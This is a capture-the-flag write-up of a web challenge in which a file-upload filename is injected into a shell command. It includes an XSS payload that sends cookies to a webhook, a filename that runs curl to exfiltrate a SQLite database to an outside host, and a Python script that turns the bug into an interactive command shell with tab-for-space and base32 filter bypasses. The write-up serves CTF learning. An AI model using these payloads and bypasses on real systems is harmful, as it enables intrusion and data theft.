# Crashing The Port

## Description

Upload your customs and my python script will detect the price 😎.

## Solution

Main page presents Filling a form, but we are soon redirected to `/login`

![Crashing The Port.png](/assets/ctf/idex.ctf.ae/crashing-the-port.png)

Since we don't have an account we can `/register`

> Creds: `test02@ctf.ae:test02@ctf.ae`

I uploaded a random  file and it just says Checking file

![Crashing The Port-1.png](/assets/ctf/idex.ctf.ae/crashing-the-port-1.png)

`/uploads/t2.py` path doesn't exist

Injecting XSS into all fields and attaching HTML with XSS payload also yielded no results... 
```html
<img src=x onerror="this.src='https://webhook.site/.../?3c='+document.cookie">
```

We can visit `/shipments` to view our *Shipments*

![Crashing The Port-2.png](/assets/ctf/idex.ctf.ae/crashing-the-port-2.png)

When fuzzing for SSTI I replaced filename and it responded with `Noooo`

![Crashing The Port-3.png](/assets/ctf/idex.ctf.ae/crashing-the-port-3.png)

It doesn't like `{}` characters in filename, yet it's still uploaded (?)

Changing filename to just single quote crashes the application and reveals some backend code.

![Crashing The Port-4.png](/assets/ctf/idex.ctf.ae/crashing-the-port-4.png)

Because `check_output` has `shell=True` this means we get free RCE, any bash like commands can be ran here.

![Crashing The Port-5.png](/assets/ctf/idex.ctf.ae/crashing-the-port-5.png)

Filename has few noticeable restrictions: first no spaces are allowed, we could have used `${IFS}` or `$IFS` as alternative space but nothing.

Tab character (`\t`) can be used as alternative space.

![Crashing The Port-6.png](/assets/ctf/idex.ctf.ae/crashing-the-port-6.png)

For me the easiest way to inject characters into burp is to Base64 encode and then decode with **Ctrl+Shift+B**
```bash
└─$ echo $'\t' | base64
CQo=
```

Anyway, no flag in sight; but there's a database?

![Crashing The Port-7.png](/assets/ctf/idex.ctf.ae/crashing-the-port-7.png)

I was able to bypass the `/` checks by using `cd`
```http
Content-Disposition: form-data; name="file"; filename="temp;cd	instance	;curl	uwuos.free.beeceptor.com	-F	f=@shipping.db"
```

Exfiltration was pointless 😭

![Crashing The Port-8.png](/assets/ctf/idex.ctf.ae/crashing-the-port-8.png)

Also `cat` is blocked, `rev` too, but not `tac` or `base32` (64 is blocked)

Make life easier:
```python
from requests import Session
from base64 import b32decode

URL = 'https://c363f5bbf5d5ce5afb9761164b2f0996.chal.ctf.ae/'
AUTH = { 'username': 'test02@ctf.ae', 'password': 'test02@ctf.ae' }
DATA_DUMMY = { 'shipperName': 'x', 'consigneeName': 'y', 'description': 'z' }

def refresh_login(session):
    session.post(f'{URL}/register', data=AUTH)
    session.post(f'{URL}/login', data=AUTH)
    print(session.cookies.get_dict())

def upload(session, files):
    return session.post(f'{URL}/upload', data=DATA_DUMMY, files=files, allow_redirects=False)

def change_path(command):
    command, filename = command.split(' ', 1) # command [/]path/to/file
    paths = filename.strip().split('/')
    cmd = 'cd ..; ' if filename.startswith('/') else ''
    cmd += '; '.join([f'cd {p}' for p in paths[:-1] if p])
    cmd += f'; {command} {paths[-1]}'
    return cmd

def read_file(command):
    cmd = command.replace('cat ', 'base32 -w0 ')
    return cmd

with Session() as session:
    refresh_login(session)
    log = open('response.logs', 'a')
    while True:
        cmd = input('[~] Command: ')
        if cmd == 'exit': break
        if '/' in cmd: cmd = change_path(cmd)
        if 'cat ' in cmd: cmd = read_file(cmd)
        cmd = cmd.replace('; ;', ';')
        cmd = cmd.replace(' ', '\t')
        print(f'[+] Command Edited: {cmd}')
        
        files = { 'file': (f'temp;{cmd}', 'letmein', 'text/plain') }
        resp = upload(session, files)
        if resp.status_code == 302:
            refresh_login(session)
            resp = upload(session, files)
            
        if 'subprocess.CalledProcessError' in resp.text:
            print('Command failed')
            continue
        elif 'Noooooooo' in resp.text:
            print('Something got blacklisted...')
            continue
        
        result = resp.text
        if 'base32' in cmd:
            result = b32decode(result.split('\n')[1]).decode()
            
        print(result)
        print(result, file=log, flush=True)

        # files = { 'file': (f'temp;cd\t..;\tcd\tapp;\tcd\tinstance;\tbase32\t-w0\tshipping.db', 'letmein', 'text/plain') }
        # resp = upload(session, files)
        # with open('sqlite3.db', 'wb') as f:
        #     f.write(resp.content)

    log.close()
```

> **Note**: Script is far from complete, decent or anything good..

Now that I have proper LFI we need to A: find the flag or B: get RCE. We can get RCE if we login in Debug Console (it's on since we saw the debug messages)

Console path doesn't work so I guess it's out of the question...

![Crashing The Port-9.png](/assets/ctf/idex.ctf.ae/crashing-the-port-9.png)

CTF ended and it turns out flag was in fucking ENV 😐

![https://media1.tenor.com/m/X13wwMFZN2YAAAAd/dies-cat.gif](https://media1.tenor.com/m/X13wwMFZN2YAAAAd/dies-cat.gif)

